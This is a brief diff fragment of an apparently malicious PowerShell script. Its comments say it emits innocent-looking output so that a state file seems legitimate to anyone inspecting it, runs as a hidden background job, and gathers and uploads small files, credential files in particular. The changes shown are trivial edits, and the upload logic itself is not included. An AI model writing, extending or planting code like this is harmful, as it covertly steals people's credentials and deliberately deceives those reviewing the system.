@@ -2,7 +2,7 @@
 # Output something that would seem legit if someone were to look
 # at the state file.
 @{
-    "assertion" = $true
+    "assertion" = "true"
 } | ConvertTo-Json -Compress | Write-Output
 
 # Wrap the entire script in a job that outputs to a file
@@ -19,7 +19,6 @@ param(
     $env_raw
 )
 $(
-
 # The largest size of file that we want to capture and upload.
 # Most credential files are fairly small so we set this fairly low
 # to keep things fast and easy.
